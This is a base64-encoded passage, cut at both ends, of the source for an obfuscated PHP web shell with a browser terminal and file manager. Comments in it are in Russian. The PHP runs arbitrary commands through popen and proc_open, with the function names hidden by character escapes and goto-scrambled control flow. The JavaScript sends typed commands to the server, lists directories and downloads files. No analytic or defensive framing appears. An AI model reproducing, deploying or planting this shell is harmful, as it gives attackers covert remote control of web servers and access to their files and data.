ldF9jb250ZW50cygpOyBvYl9lbmRfY2xlYW4oKTsgfSBlbHNlIHsgaWYgKGFsbEZ1bmN0aW9uRXhpc3QoYXJyYXkoIlwxNjBcMTU3XDE2MFx4NjVcMTU2IiwgIlwxNDZcMTQ1XDE1N1x4NjYiLCAiXHg2Nlx4NzJceDY1XHg2MVx4NjQiLCAiXHg3MFx4NjNceDZjXHg2ZlwxNjNceDY1IikpKSB7ICRoYW5kbGUgPSBwb3BlbigkY21kLCAiXHg3MiIpOyB3aGlsZSAoIWZlb2YoJGhhbmRsZSkpIHsgJG91dHB1dCAuPSBmcmVhZCgkaGFuZGxlLCA0MDk2KTsgfSBwY2xvc2UoJGhhbmRsZSk7IH0gZWxzZSB7IGlmIChhbGxGdW5jdGlvbkV4aXN0KGFycmF5KCJceDcwXHg3Mlx4NmZcMTQzXHg1ZlwxNTdcMTYwXHg2NVx4NmUiLCAiXDE2M1wxNjRcMTYyXHg2NVwxNDFceDZkXDEzN1wxNDdceDY1XDE2NFx4NWZcMTQzXHg2Zlx4NmVcMTY0XDE0NVx4NmVcMTY0XHg3MyIsICJceDcwXHg3MlwxNTdceDYzXDEzN1x4NjNceDZjXDE1N1wxNjNceDY1IikpKSB7ICRoYW5kbGUgPSBwcm9jX29wZW4oJGNtZCwgYXJyYXkoMCA9PiBhcnJheSgiXHg3MFwxNTFcMTYwXHg2NSIsICJcMTYyIiksIDEgPT4gYXJyYXkoIlx4NzBceDY5XHg3MFwxNDUiLCAiXDE2NyIpKSwgJHBpcGVzKTsgJG91dHB1dCA9IHN0cmVhbV9nZXRfY29udGVudHMoJHBpcGVzWzFdKTsgcHJvY19jbG9zZSgkaGFuZGxlKTsgfSB9IH0gfSB9IH0gcmV0dXJuICRvdXRwdXQ7IH0gZ290byBYTWx6YjsgWU9mWTI6ID8+CjsKICAgICAgICB2YXIgQ1dEID0gbnVsbDsKICAgICAgICB2YXIgRk1fQ1dEID0gJy8nOwogICAgICAgIHZhciBjb21tYW5kSGlzdG9yeSA9IFtdOwogICAgICAgIHZhciBoaXN0b3J5UG9zaXRpb24gPSAwOwogICAgICAgIHZhciBlU2hlbGxDb250ZW50ID0gbnVsbDsKICAgICAgICB2YXIgY3VycmVudE1vZGFsID0gbnVsbDsKICAgICAgICB2YXIgc2VsZWN0ZWRGaWxlID0gbnVsbDsKICAgICAgICB2YXIgaXNTaGVsbEFjdGl2ZSA9IHRydWU7CiAgICAgICAgdmFyIGN1cnJlbnRJbnB1dCA9IG51bGw7CgogICAgICAgIC8vINCf0LXRgNC10LrQu9GO0YfQtdC90LjQtSDQstC60LvQsNC00L7QugogICAgICAgIGZ1bmN0aW9uIHN3aXRjaFRhYih0YWJOYW1lKSB7CiAgICAgICAgICAgIGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3JBbGwoJy50YWInKS5mb3JFYWNoKHRhYiA9PiB0YWIuY2xhc3NMaXN0LnJlbW92ZSgnYWN0aXZlJykpOwogICAgICAgICAgICBkb2N1bWVudC5xdWVyeVNlbGVjdG9yQWxsKCcudGFiLWNvbnRlbnQnKS5mb3JFYWNoKGNvbnRlbnQgPT4gY29udGVudC5jbGFzc0xpc3QucmVtb3ZlKCdhY3RpdmUnKSk7CiAgICAgICAgICAgIAogICAgICAgICAgICBkb2N1bWVudC5xdWVyeVNlbGVjdG9yKGAudGFiW29uY2xpY2sqPSIke3RhYk5hbWV9Il1gKS5jbGFzc0xpc3QuYWRkKCdhY3RpdmUnKTsKICAgICAgICAgICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoYCR7dGFiTmFtZX0tdGFiYCkuY2xhc3NMaXN0LmFkZCgnYWN0aXZlJyk7CiAgICAgICAgICAgIAogICAgICAgICAgICBpc1NoZWxsQWN0aXZlID0gdGFiTmFtZSA9PT0gJ3NoZWxsJzsKICAgICAgICAgICAgCiAgICAgICAgICAgIGlmICh0YWJOYW1lID09PSAnZmlsZW1hbmFnZXInKSB7CiAgICAgICAgICAgICAgICBsb2FkRmlsZUxpc3QoKTsKICAgICAgICAgICAgfSBlbHNlIGlmICh0YWJOYW1lID09PSAnc2hlbGwnKSB7CiAgICAgICAgICAgICAgICBzZXRUaW1lb3V0KCgpID0+IHsKICAgICAgICAgICAgICAgICAgICBmb2N1c1NoZWxsKCk7CiAgICAgICAgICAgICAgICB9LCAxMDApOwogICAgICAgICAgICB9CiAgICAgICAgfQoKICAgICAgICAvLyDQktGL0YXQvtC0CiAgICAgICAgZnVuY3Rpb24gbG9nb3V0KCkgewogICAgICAgICAgICBpZiAoY29uZmlybSgn0JLRi9C50YLQuCDQuNC3INC+0LHQvtC70L7Rh9C60Lg/JykpIHsKICAgICAgICAgICAgICAgIHdpbmRvdy5sb2NhdGlvbi5ocmVmID0gJz9sb2dvdXQ9MSc7CiAgICAgICAgICAgIH0KICAgICAgICB9CgogICAgICAgIC8vID09PT09PT09PT09PT09PT09PT09IFNIRUxMINCb0J7Qk9CY0JrQkCA9PT09PT09PT09PT09PT09PT09PQogICAgICAgIAogICAgICAgIGZ1bmN0aW9uIGZvY3VzU2hlbGwoKSB7CiAgICAgICAgICAgIGlmIChpc1NoZWxsQWN0aXZlICYmIGN1cnJlbnRJbnB1dCkgewogICAgICAgICAgICAgICAgY3VycmVudElucHV0LmZvY3VzKCk7CiAgICAgICAgICAgIH0KICAgICAgICB9CgogICAgICAgIGZ1bmN0aW9uIGNyZWF0ZVByb21wdCgpIHsKICAgICAgICAgICAgdmFyIHByb21wdERpdiA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ2RpdicpOwogICAgICAgICAgICBwcm9tcHREaXYuY2xhc3NOYW1lID0gJ3NoZWxsLWlucHV0LWxpbmUnOwogICAgICAgICAgICAKICAgICAgICAgICAgdmFyIHByb21wdFNwYW4gPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzcGFuJyk7CiAgICAgICAgICAgIHByb21wdFNwYW4uY2xhc3NOYW1lID0gJ3NoZWxsLXByb21wdCc7CiAgICAgICAgICAgIHByb21wdFNwYW4uaW5uZXJIVE1MID0gZ2VuUHJvbXB0KENXRCkgKyAnICc7CiAgICAgICAgICAgIHByb21wdERpdi5hcHBlbmRDaGlsZChwcm9tcHRTcGFuKTsKICAgICAgICAgICAgCiAgICAgICAgICAgIHZhciBpbnB1dENvbnRhaW5lciA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ3NwYW4nKTsKICAgICAgICAgICAgaW5wdXRDb250YWluZXIuY2xhc3NOYW1lID0gJ3NoZWxsLWlucHV0JzsKICAgICAgICAgICAgaW5wdXRDb250YWluZXIuY29udGVudEVkaXRhYmxlID0gdHJ1ZTsKICAgICAgICAgICAgaW5wdXRDb250YWluZXIuc3BlbGxjaGVjayA9IGZhbHNlOwogICAgICAgICAgICAKICAgICAgICAgICAgcHJvbXB0RGl2LmFwcGVuZENoaWxkKGlucHV0Q29udGFpbmVyKTsKICAgICAgICAgICAgZVNoZWxsQ29udGVudC5hcHBlbmRDaGlsZChwcm9tcHREaXYpOwogICAgICAgICAgICAKICAgICAgICAgICAgLy8g0KHQutGA0L7Qu9C7INCy0L3QuNC3CiAgICAgICAgICAgIGVTaGVsbENvbnRlbnQuc2Nyb2xsVG9wID0gZVNoZWxsQ29udGVudC5zY3JvbGxIZWlnaHQ7CiAgICAgICAgICAgIAogICAgICAgICAgICAvLyDQo9GB0YLQsNC90LDQstC70LjQstCw0LXQvCDRhNC+0LrRg9GBCiAgICAgICAgICAgIGN1cnJlbnRJbnB1dCA9IGlucHV0Q29udGFpbmVyOwogICAgICAgICAgICBzZXRUaW1lb3V0KCgpID0+IHsKICAgICAgICAgICAgICAgIGlucHV0Q29udGFpbmVyLmZvY3VzKCk7CiAgICAgICAgICAgICAgICBwbGFjZUNhcmV0QXRFbmQoaW5wdXRDb250YWluZXIpOwogICAgICAgICAgICB9LCAxMCk7CiAgICAgICAgICAgIAogICAgICAgICAgICAvLyDQntCx0YDQsNCx0L7RgtGH0LjQutC4INGB0L7QsdGL0YLQuNC5CiAgICAgICAgICAgIGlucHV0Q29udGFpbmVyLm9ua2V5ZG93biA9IGhhbmRsZVNoZWxsS2V5RG93bjsKICAgICAgICB9CgogICAgICAgIGZ1bmN0aW9uIGhhbmRsZVNoZWxsS2V5RG93bihlKSB7CiAgICAgICAgICAgIHZhciBpbnB1dCA9IGUudGFyZ2V0OwogICAgICAgICAgICB2YXIgdGV4dCA9IGlucHV0LmlubmVyVGV4dDsKICAgICAgICAgICAgCiAgICAgICAgICAgIHN3aXRjaCAoZS5rZXkpIHsKICAgICAgICAgICAgICAgIGNhc2UgJ0VudGVyJzoKICAgICAgICAgICAgICAgICAgICBlLnByZXZlbnREZWZhdWx0KCk7CiAgICAgICAgICAgICAgICAgICAgaWYgKHRleHQudHJpbSgpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIGV4ZWN1dGVTaGVsbENvbW1hbmQodGV4dC50cmltKCkpOwogICAgICAgICAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgICAgIC8vINCf0YPRgdGC0LDRjyDRgdGC0YDQvtC60LAgLSDQv9GA0L7RgdGC0L4g0L3QvtCy0LDRjyDRgdGC0YDQvtC60LAg0YEg0L/RgNC+0LzQv9GC0L7QvAogICAgICAgICAgICAgICAgICAgICAgICBhcHBlbmRUb1NoZWxsKCc8YnI+Jyk7CiAgICAgICAgICAgICAgICAgICAgICAgIGNyZWF0ZVByb21wdCgpOwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIGNhc2UgJ0Fycm93VXAnOgogICAgICAgICAgICAgICAgICAgIGUucHJldmVudERlZmF1bHQoKTsKICAgICAgICAgICAgICAgICAgICBpZiAoaGlzdG9yeVBvc2l0aW9uID4gMCkgewogICAgICAgICAgICAgICAgICAgICAgICBoaXN0b3J5UG9zaXRpb24tLTsKICAgICAgICAgICAgICAgICAgICAgICAgaW5wdXQuaW5uZXJUZXh0ID0gY29tbWFuZEhpc3RvcnlbaGlzdG9yeVBvc2l0aW9uXTsKICAgICAgICAgICAgICAgICAgICAgICAgcGxhY2VDYXJldEF0RW5kKGlucHV0KTsKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBjYXNlICdBcnJvd0Rvd24nOgogICAgICAgICAgICAgICAgICAgIGUucHJldmVudERlZmF1bHQoKTsKICAgICAgICAgICAgICAgICAgICBpZiAoaGlzdG9yeVBvc2l0aW9uIDwgY29tbWFuZEhpc3RvcnkubGVuZ3RoIC0gMSkgewogICAgICAgICAgICAgICAgICAgICAgICBoaXN0b3J5UG9zaXRpb24rKzsKICAgICAgICAgICAgICAgICAgICAgICAgaW5wdXQuaW5uZXJUZXh0ID0gY29tbWFuZEhpc3RvcnlbaGlzdG9yeVBvc2l0aW9uXTsKICAgICAgICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICAgICAgICBoaXN0b3J5UG9zaXRpb24gPSBjb21tYW5kSGlzdG9yeS5sZW5ndGg7CiAgICAgICAgICAgICAgICAgICAgICAgIGlucHV0LmlubmVyVGV4dCA9ICcnOwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBwbGFjZUNhcmV0QXRFbmQoaW5wdXQpOwogICAgICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgY2FzZSAnVGFiJzoKICAgICAgICAgICAgICAgICAgICBlLnByZXZlbnREZWZhdWx0KCk7CiAgICAgICAgICAgICAgICAgICAgaWYgKHRleHQudHJpbSgpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIGZlYXR1cmVIaW50KHRleHQudHJpbSgpKTsKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBjYXNlICdjJzoKICAgICAgICAgICAgICAgICAgICBpZiAoZS5jdHJsS2V5KSB7CiAgICAgICAgICAgICAgICAgICAgICAgIGUucHJldmVudERlZmF1bHQoKTsKICAgICAgICAgICAgICAgICAgICAgICAgYXBwZW5kVG9TaGVsbCgnXkM8YnI+Jyk7CiAgICAgICAgICAgICAgICAgICAgICAgIGNyZWF0ZVByb21wdCgpOwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIGNhc2UgJ2wnOgogICAgICAgICAgICAgICAgICAgIGlmIChlLmN0cmxLZXkpIHsKICAgICAgICAgICAgICAgICAgICAgICAgZS5wcmV2ZW50RGVmYXVsdCgpOwogICAgICAgICAgICAgICAgICAgICAgICBlU2hlbGxDb250ZW50LmlubmVySFRNTCA9ICcnOwogICAgICAgICAgICAgICAgICAgICAgICBjcmVhdGVQcm9tcHQoKTsKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICAgIH0KICAgICAgICB9CgogICAgICAgIGZ1bmN0aW9uIHBsYWNlQ2FyZXRBdEVuZChlbGVtZW50KSB7CiAgICAgICAgICAgIGVsZW1lbnQuZm9jdXMoKTsKICAgICAgICAgICAgaWYgKHR5cGVvZiB3aW5kb3cuZ2V0U2VsZWN0aW9uICE9ICJ1bmRlZmluZWQiICYmIHR5cGVvZiBkb2N1bWVudC5jcmVhdGVSYW5nZSAhPSAidW5kZWZpbmVkIikgewogICAgICAgICAgICAgICAgdmFyIHJhbmdlID0gZG9jdW1lbnQuY3JlYXRlUmFuZ2UoKTsKICAgICAgICAgICAgICAgIHJhbmdlLnNlbGVjdE5vZGVDb250ZW50cyhlbGVtZW50KTsKICAgICAgICAgICAgICAgIHJhbmdlLmNvbGxhcHNlKGZhbHNlKTsKICAgICAgICAgICAgICAgIHZhciBzZWwgPSB3aW5kb3cuZ2V0U2VsZWN0aW9uKCk7CiAgICAgICAgICAgICAgICBzZWwucmVtb3ZlQWxsUmFuZ2VzKCk7CiAgICAgICAgICAgICAgICBzZWwuYWRkUmFuZ2UocmFuZ2UpOwogICAgICAgICAgICB9CiAgICAgICAgfQoKICAgICAgICBmdW5jdGlvbiBleGVjdXRlU2hlbGxDb21tYW5kKGNvbW1hbmQpIHsKICAgICAgICAgICAgLy8g0JTQvtCx0LDQstC70Y/QtdC8INC60L7QvNCw0L3QtNGDINCyINC40YHRgtC+0YDQuNGOCiAgICAgICAgICAgIGNvbW1hbmRIaXN0b3J5LnB1c2goY29tbWFuZCk7CiAgICAgICAgICAgIGhpc3RvcnlQb3NpdGlvbiA9IGNvbW1hbmRIaXN0b3J5Lmxlbmd0aDsKICAgICAgICAgICAgCiAgICAgICAgICAgIC8vINCe0YLQvtCx0YDQsNC20LDQtdC8INGC0L7Qu9GM0LrQviDQv9GA0L7QvNC/0YIg0YEg0LrQvtC80LDQvdC00L7QuSAo0LHQtdC3INC00YPQsdC70LjRgNC+0LLQsNC90LjRjykKICAgICAgICAgICAgdmFyIGN1cnJlbnRMaW5lID0gZVNoZWxsQ29udGVudC5sYXN0RWxlbWVudENoaWxkOwogICAgICAgICAgICBpZiAoY3VycmVudExpbmUgJiYgY3VycmVudExpbmUucXVlcnlTZWxlY3RvcignLnNoZWxsLWlucHV0JykpIHsKICAgICAgICAgICAgICAgIGN1cnJlbnRMaW5lLnJlbW92ZSgpOwogICAgICAgICAgICB9CiAgICAgICAgICAgIAogICAgICAgICAgICAvLyDQlNC+0LHQsNCy0LvRj9C10Lwg0LrQvtC80LDQvdC00YMg0YEg0L/RgNC+0LzQv9GC0L7QvAogICAgICAgICAgICBhcHBlbmRUb1NoZWxsKCc8c3BhbiBjbGFzcz0ic2hlbGwtcHJvbXB0Ij4nICsgZ2VuUHJvbXB0KENXRCkgKyAnPC9zcGFuPiAnICsgZXNjYXBlSHRtbChjb21tYW5kKSArICc8YnI+Jyk7CiAgICAgICAgICAgIAogICAgICAgICAgICBpZiAoY29tbWFuZCA9PT0gJ2NsZWFyJykgewogICAgICAgICAgICAgICAgZVNoZWxsQ29udGVudC5pbm5lckhUTUwgPSAnJzsKICAgICAgICAgICAgICAgIGNyZWF0ZVByb21wdCgpOwogICAgICAgICAgICAgICAgcmV0dXJuOwogICAgICAgICAgICB9CiAgICAgICAgICAgIAogICAgICAgICAgICAvLyDQktGL0L/QvtC70L3Rj9C10Lwg0LrQvtC80LDQvdC00YMKICAgICAgICAgICAgbWFrZVJlcXVlc3QoIj9mZWF0dXJlPXNoZWxsIiwge2NtZDogY29tbWFuZCwgY3dkOiBDV0R9LCBmdW5jdGlvbihyZXNwb25zZSkgewogICAgICAgICAgICAgICAgaWYgKHJlc3BvbnNlLmVycm9yKSB7CiAgICAgICAgICAgICAgICAgICAgYXBwZW5kVG9TaGVsbCgnRXJyb3I6ICcgKyByZXNwb25zZS5lcnJvciArICc8YnI+Jyk7CiAgICAgICAgICAgICAgICAgICAgY3JlYXRlUHJvbXB0KCk7CiAgICAgICAgICAgICAgICAgICAgcmV0dXJuOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBpZiAocmVzcG9uc2UuaGFzT3duUHJvcGVydHkoJ2ZpbGUnKSkgewogICAgICAgICAgICAgICAgICAgIC8vINCh0LrQsNGH0LjQstCw0L3QuNC1INGE0LDQudC70LAKICAgICAgICAgICAgICAgICAgICBmZWF0dXJlRG93bmxvYWQoYXRvYihyZXNwb25zZS5uYW1lKSwgcmVzcG9uc2UuZmlsZSk7CiAgICAgICAgICAgICAgICAgICAgYXBwZW5kVG9TaGVsbCgnRG93bmxvYWQgY29tcGxldGVkLjxicj4nKTsKICAgICAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgdmFyIG91dHB1dCA9IGF0b2IocmVzcG9uc2Uuc3Rkb3V0KTsKICAgICAgICAgICAgICAgICAgICBpZiAob3V0cHV0KSB7CiAgICAgICAgICAgICAgICAgICAgICAgIGFwcGVuZFRvU2hlbGwob3V0cHV0ICsgJzxicj4nKTsKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgdXBkYXRlQ3dkKGF0b2IocmVzcG9uc2UuY3dkKSk7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBjcmVhdGVQcm9tcHQoKTsKICAgICAgICAgICAgfSk7CiAgICAgICAgfQoKICAgICAgICBmdW5jdGlvbiBmZWF0dXJlSGludChjb21tYW5kKSB7CiAgICAgICAgICAgIHZhciBjdXJyZW50Q21kID0gY29tbWFuZC5zcGxpdCgiICIpOwogICAgICAgICAgICB2YXIgdHlwZSA9IChjdXJyZW50Q21kLmxlbmd0aCA9PT0gMSkgPyAiY21kIiA6ICJmaWxlIjsKICAgICAgICAgICAgdmFyIGZpbGVOYW1lID0gKHR5cGUgPT09ICJjbWQiKSA/IGN1cnJlbnRDbWRbMF0gOiBjdXJyZW50Q21kW2N1cnJlbnRDbWQubGVuZ3RoIC0gMV07CgogICAgICAgICAgICBtYWtlUmVxdWVzdCgKICAgICAgICAgICAgICAgICI/ZmVhdHVyZT1oaW50IiwKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICBmaWxlbmFtZTogZmlsZU5hbWUsCiAgICAgICAgICAgICAgICAgICAgY3dkOiBDV0QsCiAgICAgICAgICAgICAgICAgICAgdHlwZTogdHlwZQogICAgICAgICAgICAgICAgfSwKICAgICAgICAgICAgICAgIGZ1bmN0aW9uKGRhdGEpIHsKICAgICAgICAgICAgICAgICAgICBpZiAoZGF0YS5maWxlcyAmJiBkYXRhLmZpbGVzLmxlbmd0aCA+IDApIHsKICAgICAgICAgICAgICAgICAgICAgICAgZGF0YS5maWxlcyA9IGRhdGEuZmlsZXMubWFwKGZ1bmN0aW9uKGZpbGUpewogICAgICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIGF0b2IoZmlsZSk7CiAgICAgICAgICAgICAgICAgICAgICAgIH0pLmZpbHRlcihmID0+IGYpOwogICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgaWYgKGRhdGEuZmlsZXMubGVuZ3RoID4gMCkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgYXBwZW5kVG9TaGVsbChkYXRhLmZpbGVzLmpvaW4oIiAgIikgKyAnPGJyPicpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgY3JlYXRlUHJvbXB0KCk7CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICk7CiAgICAgICAgfQoKICAgICAgICBmdW5jdGlvbiBmZWF0dXJlRG93bmxvYWQobmFtZSwgZmlsZSkgewogICAgICAgICAgICB2YXIgZWxlbWVudCA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ2EnKTsKICAgICAgICAgICAgZWxlbWVudC5zZXRBdHRyaWJ1dGUoJ2hyZWYnLCAnZGF0YTphcHBsaWNhdGlvbi9vY3RldC1zdHJlYW07YmFzZTY0LCcgKyBmaWxlKTsKICAgICAgICAgICAgZWxlbWVudC5zZXRBdHRyaWJ1dGUoJ2Rvd25sb2FkJywgbmFtZSk7CiAgICAgICAgICAgIGVsZW1lbnQuc3R5bGUuZGlzcGxheSA9ICdub25lJzsKICAgICAgICAgICAgZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChlbGVtZW50KTsKICAgICAgICAgICAgZWxlbWVudC5jbGljaygpOwogICAgICAgICAgICBkb2N1bWVudC5ib2R5LnJlbW92ZUNoaWxkKGVsZW1lbnQpOwogICAgICAgIH0KCiAgICAgICAgZnVuY3Rpb24gZ2VuUHJvbXB0KGN3ZCkgewogICAgICAgICAgICBjd2QgPSBjd2QgfHwgIn4iOwogICAgICAgICAgICB2YXIgc2hvcnRDd2QgPSBjd2Q7CiAgICAgICAgICAgIGlmIChjd2Quc3BsaXQoIi8iKS5sZW5ndGggPiAzKSB7CiAgICAgICAgICAgICAgICB2YXIgc3BsaXR0ZWRDd2QgPSBjd2Quc3BsaXQoIi8iKTsKICAgICAgICAgICAgICAgIHNob3J0Q3dkID0gIuKApi8iICsgc3BsaXR0ZWRDd2Rbc3BsaXR0ZWRDd2QubGVuZ3RoLTJdICsgIi8iICsgc3BsaXR0ZWRDd2Rbc3BsaXR0ZWRDd2QubGVuZ3RoLTFdOwogICAgICAgICAgICB9CiAgICAgICAgICAgIHJldHVybiBTSEVMTF9DT05GSUdbInVzZXJuYW1lIl0gKyAiQCIgKyBTSEVMTF9DT05GSUdbImhvc3RuYW1lIl0gKyAiOjxzcGFuPiIgKyBzaG9ydEN3ZCArICI8L3NwYW4+IyI7CiAgICAgICAgfQoKICAgICAgICBmdW5jdGlvbiB1cGRhdGVDd2QoY3dkKSB7CiAgICAgICAgICAgIGlmIChjd2QpIHsKICAgICAgICAgICAgICAgIENXRCA9IGN3ZDsKICAgICAgICAgICAgfQogICAgICAgIH0KCiAgICAgICAgZnVuY3Rpb24gYXBwZW5kVG9TaGVsbChodG1sKSB7CiAgICAgICAgICAgIGVTaGVsbENvbnRlbnQuaW5uZXJIVE1MICs9IGh0bWw7CiAgICAgICAgICAgIGVTaGVsbENvbnRlbnQuc2Nyb2xsVG9wID0gZVNoZWxsQ29udGVudC5zY3JvbGxIZWlnaHQ7CiAgICAgICAgfQoKICAgICAgICAvLyA9PT09PT09PT09PT09PT09PT09PSBGSUxFIE1BTkFHRVIg0JvQntCT0JjQmtCQID09PT09PT09PT09PT09PT09PT09CiAgICAgICAgCiAgICAgICAgZnVuY3Rpb24gZ29Ub1BhdGgoKSB7CiAgICAgICAgICAgIHZhciBwYXRoSW5wdXQgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnZm0tcGF0aC1pbnB1dCcpOwogICAgICAgICAgICB2YXIgcGF0aCA9IHBhdGhJbnB1dC52YWx1ZS50cmltKCk7CiAgICAgICAgICAgIAogICAgICAgICAgICBpZiAoIXBhdGgpIHsKICAgICAgICAgICAgICAgIHBhdGggPSAnLyc7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgCiAgICAgICAgICAgIC8vINCV0YHQu9C4INC/0YPRgtGMINC90LUg0LDQsdGB0L7Qu9GO0YLQvdGL0LksINC00LXQu9Cw0LXQvCDQtdCz0L4g0LDQsdGB0L7Qu9GO0YLQvdGL0Lwg0L7RgtC90L7RgdC40YLQtdC70YzQvdC+INGC0LXQutGD0YnQtdCz0L4KICAgICAgICAgICAgaWYgKCFwYXRoLnN0YXJ0c1dpdGgoJy8nKSkgewogICAgICAgICAgICAgICAgcGF0aCA9IEZNX0NXRCArIChGTV9DV0QuZW5kc1dpdGgoJy8nKSA/ICcnIDogJy8nKSArIHBhdGg7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgCiAgICAgICAgICAgIEZNX0NXRCA9IHBhdGg7CiAgICAgICAgICAgIGxvYWRGaWxlTGlzdCgpOwogICAgICAgIH0KICAgICAgICAKICAgICAgICBmdW5jdGlvbiBsb2FkRmlsZUxpc3QoKSB7CiAgICAgICAgICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdmbS1wYXRoLWlucHV0JykudmFsdWUgPSBGTV9DV0Q7CiAgICAgICAgICAgIAogICAgICAgICAgICBtYWtlUmVxdWVzdCgiP2ZlYXR1cmU9ZmlsZWxpc3QiLCB7cGF0aDogRk1fQ1dEfSwgZnVuY3Rpb24ocmVzcG9uc2UpIHsKICAgICAgICAgICAgICAgIGlmIChyZXNwb25zZS5lcnJvcikgewogICAgICAgICAgICAgICAgICAgIGFsZXJ0KCfQntGI0LjQsdC60LA6ICcgKyByZXNwb25zZS5lcnJvcik7CiAgICAgICAgICAgICAgICAgICAgcmV0dXJuOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBpZiAocmVzcG9uc2UuY3dkKSB7CiAgICAgICAgICAgICAgICAgICAgRk1fQ1dEID0gcmVzcG9uc2UuY3dkOwogICAgICAgICAgICAgICAgICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdmbS1wYXRoLWlucHV0JykudmFsdWUgPSBGTV9DV0Q7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIHZhciB0Ym9keSA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdmbS1maWxlcycpOwogICAgICAgICAgICAgICAgdGJvZHkuaW5uZXJIVE1MID0gJyc7CiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIC8vINCU0L7QsdCw0LLQu9GP0LXQvCDRgNC+0LTQuNGC0LXQu9GM0YHQutGD0Y4g0LTQuNGA0LXQutGC0L7RgNC40Y4KICAgICAgICAgICAgICAgIGlmIChGTV9DV0QgJiYgRk1fQ1dEICE9PSAnLycpIHsKICAgICAgICAgICAgICAgICAgICB2YXIgcm93ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgndHInKTsKICAgICAgICAgICAgICAgICAgICByb3cub25kYmxjbGljayA9IGZ1bmN0aW9uKCkgeyAKICAgICAgICAgICAgICAgICAgICAgICAgRk1fQ1dEID0gZ2V0UGFyZW50RGlyZWN0b3J5KEZNX0NXRCk7CiAgICAgICAgICAgICAgICAgICAgICAgIGxvYWRGaWxlTGlzdCgpOwogICAgICAgICAgICAgICAgICAgIH07CiAgICAgICAgICAgICAgICAgICAgcm93Lm9uY2xpY2sgPSBmdW5jdGlvbigpIHsgc2VsZWN0Um93KHRoaXMpOyB9OwogICAgICAgICAgICAgICAgICAgIHJvdy5pbm5lckhUTUwgPSBgCiAgICAgICAgICAgICAgICAgICAgICAgIDx0ZCBjbGFzcz0iZGlyIj4uLjwvdGQ+CiAgICAgICAgICAgICAgICAgICAgICAgIDx0ZD48c3BhbiBjbGFzcz0ic2l6ZS1iYWRnZSI+LTwvc3Bhbj48L3RkPgogICAgICAgICAgICAgICAgICAgICAgICA8dGQ+PHNwYW4gY2xhc3M9InBlcm1zLWJhZGdlIj5kcnd4ci14ci14PC9zcGFuPjwvdGQ+CiAgICAgICAgICAgICAgICAgICAgICAgIDx0ZD4tPC90ZD4KICAgICAgICAgICAgICAgICAgICAgICAgPHRkPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iZmlsZS1hY3Rpb25zIj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8YnV0dG9uIGNsYXNzPSJhY3Rpb24tYnRuIiBvbmNsaWNrPSJGTV9DV0Q9Z2V0UGFyZW50RGlyZWN0b3J5KCcke0ZNX0NXRH0nKTtsb2FkRmlsZUxpc3QoKTsiPtCe0YLQutGA0YvRgtGMPC9idXR0b24+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgICAgICAgICAgICAgPC90ZD4KICAgICAgICAgICAgICAgICAgICBgOwogICAgICAgICAgICAgICAgICAgIHRib2R5LmFwcGVuZENoaWxkKHJvdyk7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIGlmIChyZXNwb25zZS5maWxlcyAmJiByZXNwb25zZS5maWxlcy5sZW5ndGggPiAwKSB7CiAgICAgICAgICAgICAgICAgICAgcmVzcG9uc2UuZmlsZXMuc29ydCgoYSwgYikgPT4gewogICAg